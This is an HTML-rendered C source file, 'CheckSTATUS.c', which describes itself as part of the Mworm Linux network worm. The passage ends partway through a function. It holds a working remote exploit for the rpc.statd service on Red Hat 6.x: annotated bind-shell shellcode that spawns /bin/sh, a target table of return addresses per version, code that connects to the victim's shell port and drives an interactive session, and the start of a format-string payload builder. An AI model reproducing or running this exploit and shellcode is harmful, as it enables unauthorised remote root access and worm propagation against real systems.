<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Linux.Mworm.a - CheckSTATUS.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//CheckSTATUS.c
//Based on Mscan
//Part of Mworm
</span><span class="sc0">
</span><span class="sc9">#include "common.h"
</span><span class="sc0">
</span><span class="sc9">#define SM_PROG 100024
#define SM_VERS 1
#define SM_STAT 1
#define SM_MAXSTRLEN 1024
</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">Status_shellcode</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc6">"\x31\xc0"</span><span class="sc0">                              </span><span class="sc1">/* xorl   %eax,%eax             */</span><span class="sc0">
</span><span class="sc1">/* jmp ricochet ------------------------------------------------------- */</span><span class="sc0">
</span><span class="sc6">"\xeb\x7c"</span><span class="sc0">                              </span><span class="sc1">/* jmp    0x7c                  */</span><span class="sc0">
</span><span class="sc1">/* kungfu: ------------------------------------------------------------ */</span><span class="sc0">
</span><span class="sc6">"\x59"</span><span class="sc0">                                  </span><span class="sc1">/* popl   %ecx                  */</span><span class="sc0">
</span><span class="sc6">"\x89\x41\x10"</span><span class="sc0">                          </span><span class="sc1">/* movl   %eax,0x10(%ecx)       */</span><span class="sc0">
</span><span class="sc1">/* ------------------------------------ socket(2,1,0); ---------------- */</span><span class="sc0">
</span><span class="sc6">"\x89\x41\x08"</span><span class="sc0">                          </span><span class="sc1">/* movl   %eax,0x8(%ecx)        */</span><span class="sc0">
</span><span class="sc6">"\xfe\xc0"</span><span class="sc0">                              </span><span class="sc1">/* incb   %al                   */</span><span class="sc0">
</span><span class="sc6">"\x89\x41\x04"</span><span class="sc0">                          </span><span class="sc1">/* movl   %eax,0x4(%ecx)        */</span><span class="sc0">
</span><span class="sc6">"\x89\xc3"</span><span class="sc0">                              </span><span class="sc1">/* movl   %eax,%ebx             */</span><span class="sc0">
</span><span class="sc6">"\xfe\xc0"</span><span class="sc0">                              </span><span class="sc1">/* incb   %al                   */</span><span class="sc0">
</span><span class="sc6">"\x89\x01"</span><span class="sc0">                              </span><span class="sc1">/* movl   %eax,(%ecx)           */</span><span class="sc0">
</span><span class="sc6">"\xb0\x66"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x66,%al             */</span><span class="sc0">
</span><span class="sc6">"\xcd\x80"</span><span class="sc0">                              </span><span class="sc1">/* int    $0x80                 */</span><span class="sc0">
</span><span class="sc1">/* ------------------------------------ bind(sd,&amp;sockaddr,16); -------- */</span><span class="sc0">
</span><span class="sc6">"\xb3\x02"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x2,%bl              */</span><span class="sc0">
</span><span class="sc6">"\x89\x59\x0c"</span><span class="sc0">                          </span><span class="sc1">/* movl   %ebx,0xc(%ecx)        */</span><span class="sc0">
</span><span class="sc6">"\xc6\x41\x0e\x99"</span><span class="sc0">                      </span><span class="sc1">/* movb   $0x99,0xe(%ecx)       */</span><span class="sc0">
</span><span class="sc6">"\xc6\x41\x08\x10"</span><span class="sc0">                      </span><span class="sc1">/* movb   $0x10,0x8(%ecx)       */</span><span class="sc0">
</span><span class="sc6">"\x89\x49\x04"</span><span class="sc0">                          </span><span class="sc1">/* movl   %ecx,0x4(%ecx)        */</span><span class="sc0">
</span><span class="sc6">"\x80\x41\x04\x0c"</span><span class="sc0">                      </span><span class="sc1">/* addb   $0xc,0x4(%ecx)        */</span><span class="sc0">
</span><span class="sc6">"\x88\x01"</span><span class="sc0">                              </span><span class="sc1">/* movb   %al,(%ecx)            */</span><span class="sc0">
</span><span class="sc6">"\xb0\x66"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x66,%al             */</span><span class="sc0">
</span><span class="sc6">"\xcd\x80"</span><span class="sc0">                              </span><span class="sc1">/* int    $0x80                 */</span><span class="sc0">
</span><span class="sc1">/* ------------------------------------ listen(sd,blah); -------------- */</span><span class="sc0">
</span><span class="sc6">"\xb3\x04"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x4,%bl              */</span><span class="sc0">
</span><span class="sc6">"\xb0\x66"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x66,%al             */</span><span class="sc0">
</span><span class="sc6">"\xcd\x80"</span><span class="sc0">                              </span><span class="sc1">/* int    $0x80                 */</span><span class="sc0">
</span><span class="sc1">/* ------------------------------------ accept(sd,0,16); -------------- */</span><span class="sc0">
</span><span class="sc6">"\xb3\x05"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x5,%bl              */</span><span class="sc0">
</span><span class="sc6">"\x30\xc0"</span><span class="sc0">                              </span><span class="sc1">/* xorb   %al,%al               */</span><span class="sc0">
</span><span class="sc6">"\x88\x41\x04"</span><span class="sc0">                          </span><span class="sc1">/* movb   %al,0x4(%ecx)         */</span><span class="sc0">
</span><span class="sc6">"\xb0\x66"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x66,%al             */</span><span class="sc0">
</span><span class="sc6">"\xcd\x80"</span><span class="sc0">                              </span><span class="sc1">/* int    $0x80                 */</span><span class="sc0">
</span><span class="sc1">/* ------------------------------------ dup2(cd,0); ------------------- */</span><span class="sc0">
</span><span class="sc6">"\x89\xce"</span><span class="sc0">                              </span><span class="sc1">/* movl   %ecx,%esi             */</span><span class="sc0">
</span><span class="sc6">"\x88\xc3"</span><span class="sc0">                              </span><span class="sc1">/* movb   %al,%bl               */</span><span class="sc0">
</span><span class="sc6">"\x31\xc9"</span><span class="sc0">                              </span><span class="sc1">/* xorl   %ecx,%ecx             */</span><span class="sc0">
</span><span class="sc6">"\xb0\x3f"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x3f,%al             */</span><span class="sc0">
</span><span class="sc6">"\xcd\x80"</span><span class="sc0">                              </span><span class="sc1">/* int    $0x80                 */</span><span class="sc0">
</span><span class="sc1">/* ------------------------------------ dup2(cd,1); ------------------- */</span><span class="sc0">
</span><span class="sc6">"\xfe\xc1"</span><span class="sc0">                              </span><span class="sc1">/* incb   %cl                   */</span><span class="sc0">
</span><span class="sc6">"\xb0\x3f"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x3f,%al             */</span><span class="sc0">
</span><span class="sc6">"\xcd\x80"</span><span class="sc0">                              </span><span class="sc1">/* int    $0x80                 */</span><span class="sc0">
</span><span class="sc1">/* ------------------------------------ dup2(cd,2); ------------------- */</span><span class="sc0">
</span><span class="sc6">"\xfe\xc1"</span><span class="sc0">                              </span><span class="sc1">/* incb   %cl                   */</span><span class="sc0">
</span><span class="sc6">"\xb0\x3f"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x3f,%al             */</span><span class="sc0">
</span><span class="sc6">"\xcd\x80"</span><span class="sc0">                              </span><span class="sc1">/* int    $0x80                 */</span><span class="sc0">
</span><span class="sc1">/* ------------------------------------ execve("/bin/sh",argv,0); ----- */</span><span class="sc0">
</span><span class="sc6">"\xc7\x06\x2f\x62\x69\x6e"</span><span class="sc0">              </span><span class="sc1">/* movl   $0x6e69622f,(%esi)    */</span><span class="sc0">
</span><span class="sc6">"\xc7\x46\x04\x2f\x73\x68\x41"</span><span class="sc0">          </span><span class="sc1">/* movl   $0x4168732f,0x4(%esi) */</span><span class="sc0">
</span><span class="sc6">"\x30\xc0"</span><span class="sc0">                              </span><span class="sc1">/* xorb   %al,%al               */</span><span class="sc0">
</span><span class="sc6">"\x88\x46\x07"</span><span class="sc0">                          </span><span class="sc1">/* movb   %al,0x7(%esi)         */</span><span class="sc0">
</span><span class="sc6">"\x89\x76\x0c"</span><span class="sc0">                          </span><span class="sc1">/* movl   %esi,0xc(%esi)        */</span><span class="sc0">
</span><span class="sc6">"\x8d\x56\x10"</span><span class="sc0">                          </span><span class="sc1">/* leal   0x10(%esi),%edx       */</span><span class="sc0">
</span><span class="sc6">"\x8d\x4e\x0c"</span><span class="sc0">                          </span><span class="sc1">/* leal   0xc(%esi),%ecx        */</span><span class="sc0">
</span><span class="sc6">"\x89\xf3"</span><span class="sc0">                              </span><span class="sc1">/* movl   %esi,%ebx             */</span><span class="sc0">
</span><span class="sc6">"\xb0\x0b"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0xb,%al              */</span><span class="sc0">
</span><span class="sc6">"\xcd\x80"</span><span class="sc0">                              </span><span class="sc1">/* int    $0x80                 */</span><span class="sc0">
</span><span class="sc1">/* ------------------------------------ exit(blah); ------------------- */</span><span class="sc0">
</span><span class="sc6">"\xb0\x01"</span><span class="sc0">                              </span><span class="sc1">/* movb   $0x1,%al              */</span><span class="sc0">
</span><span class="sc6">"\xcd\x80"</span><span class="sc0">                              </span><span class="sc1">/* int    $0x80                 */</span><span class="sc0">
</span><span class="sc1">/* ricochet: call kungfu ---------------------------------------------- */</span><span class="sc0">
</span><span class="sc6">"\xe8\x7f\xff\xff\xff"</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* call   -0x81                 */</span><span class="sc0">

</span><span class="sc16">enum</span><span class="sc0"> </span><span class="sc11">res</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">stat_succ</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">stat_fail</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sm_name</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mon_name</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sm_stat_res</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">enum</span><span class="sc0"> </span><span class="sc11">res</span><span class="sc0"> </span><span class="sc11">res_stat</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">state</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc19">type</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">type</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">desc</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">code</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">bufpos</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">buflen</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">offset</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">wipe</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc19">type</span><span class="sc0"> </span><span class="sc11">types</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Redhat 6.2 (nfs-utils-0.1.6-2)"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Status_shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbffff314</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">},</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Redhat 6.1 (knfsd-1.4.7-7)"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Status_shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbffff314</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">},</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Redhat 6.0 (knfsd-1.2.2-4)"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Status_shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbffff314</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1024</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">},</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc11">bool_t</span><span class="sc0">
</span><span class="sc11">xdr_sm_name</span><span class="sc10">(</span><span class="sc11">XDR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">xdrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sm_name</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">objp</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">xdr_string</span><span class="sc10">(</span><span class="sc11">xdrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">objp</span><span class="sc10">-&gt;</span><span class="sc11">mon_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SM_MAXSTRLEN</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">bool_t</span><span class="sc0">
</span><span class="sc11">xdr_res</span><span class="sc10">(</span><span class="sc11">XDR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">xdrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">enum</span><span class="sc0"> </span><span class="sc11">res</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">objp</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">xdr_enum</span><span class="sc10">(</span><span class="sc11">xdrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">enum_t</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">objp</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">bool_t</span><span class="sc0">
</span><span class="sc11">xdr_sm_stat_res</span><span class="sc10">(</span><span class="sc11">XDR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">xdrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sm_stat_res</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">objp</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">xdr_res</span><span class="sc10">(</span><span class="sc11">xdrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">objp</span><span class="sc10">-&gt;</span><span class="sc11">res_stat</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">xdr_int</span><span class="sc10">(</span><span class="sc11">xdrs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">objp</span><span class="sc10">-&gt;</span><span class="sc11">state</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">STATUS_runshell</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sockd</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fmax</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">fd_set</span><span class="sc0"> </span><span class="sc11">fds</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">fmax</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">max</span><span class="sc10">(</span><span class="sc11">fileno</span><span class="sc10">(</span><span class="sc11">stdin</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">sockd</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cd /; ls -alF; id;\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">19</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc10">(;;)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc11">FD_ZERO</span><span class="sc10">(&amp;</span><span class="sc11">fds</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc11">fileno</span><span class="sc10">(</span><span class="sc11">stdin</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fds</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc11">sockd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fds</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">select</span><span class="sc10">(</span><span class="sc11">fmax</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fds</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">FD_ISSET</span><span class="sc10">(</span><span class="sc11">sockd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fds</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">bzero</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sockd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">ret</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fileno</span><span class="sc10">(</span><span class="sc11">stdout</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">FD_ISSET</span><span class="sc10">(</span><span class="sc11">fileno</span><span class="sc10">(</span><span class="sc11">stdin</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fds</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">bzero</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fileno</span><span class="sc10">(</span><span class="sc11">stdin</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">STATUS_connection</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iptr</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sockd</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc11">sockd</span><span class="sc10">=</span><span class="sc11">TCP_NB_connect</span><span class="sc10">(</span><span class="sc11">iptr</span><span class="sc10">-&gt;</span><span class="sc11">h_network</span><span class="sc10">,</span><span class="sc4">39168</span><span class="sc10">,</span><span class="sc11">CONNECT_TIME</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sockd</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//      STATUS_runshell(sockd);
</span><span class="sc0">    </span><span class="sc11">FTP_shell</span><span class="sc10">(</span><span class="sc11">sockd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">sockd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0">
</span><span class="sc11">STATUS_wizardry</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">bufpos</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">buflen</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">wipe</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pad</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">pbyte</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc19">ptr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">retpos</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">u_long</span><span class="sc0"> </span><span class="sc11">dstpos</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">bufpos</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">bufpos</span><span class="sc10">--;</span><span class="sc0">
    </span><span class="sc1">/* buflen + ebp */</span><span class="sc0">
    </span><span class="sc11">retpos</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bufpos</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">buflen</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/*
** 0x00 == '\0'
** 0x25 == '%'
** (add troublesome bytes)
** Alignment requirements aid comparisons
*/</span><span class="sc0">

    </span><span class="sc11">pbyte</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">retpos</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* Yes, it's 0x24 */</span><span class="sc0">
